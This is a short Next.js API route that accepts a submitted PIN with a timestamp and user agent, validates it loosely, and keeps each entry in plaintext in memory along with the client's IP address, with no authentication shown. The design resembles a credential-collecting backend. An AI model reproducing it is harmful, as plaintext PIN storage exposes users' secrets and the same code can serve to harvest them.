import { NextRequest, NextResponse } from 'next/server';

// In-memory storage for development (will reset on each deployment)
let pins: any[] = [];

// Input validation function
function validatePin(pin: string): string | null {
  if (!pin || typeof pin !== 'string') {
    return 'Valid PIN is required';
  }
  
  if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(pin)) {
    return 'PIN contains invalid characters';
  }
  
  if (pin.length > 50) {
    return 'PIN too long';
  }
  
  return null;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { pin, ts, ua } = body || {};
    
    // Validate PIN
    const validationError = validatePin(pin);
    if (validationError) {
      return NextResponse.json(
        { error: validationError },
        { status: 400 }
      );
    }
    
    const newEntry = {
      pin: pin.trim(),
      ts: ts || new Date().toISOString(),
      ua: (ua || '').substring(0, 500), // Limit user agent length
      ip: request.ip || request.headers.get('x-forwarded-for') || 'unknown',
      createdAt: new Date().toISOString()
    };
    
    pins.push(newEntry);
    
    // Keep only last 1000 entries to prevent memory issues
    if (pins.length > 1000) {
      pins = pins.slice(-1000);
    }
    
    console.log(`PIN saved successfully from IP: ${newEntry.ip}`);
    
    return NextResponse.json({ 
      status: 'ok', 
      message: 'PIN saved successfully' 
    });
    
  } catch (error) {
    console.error('Error saving PIN:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
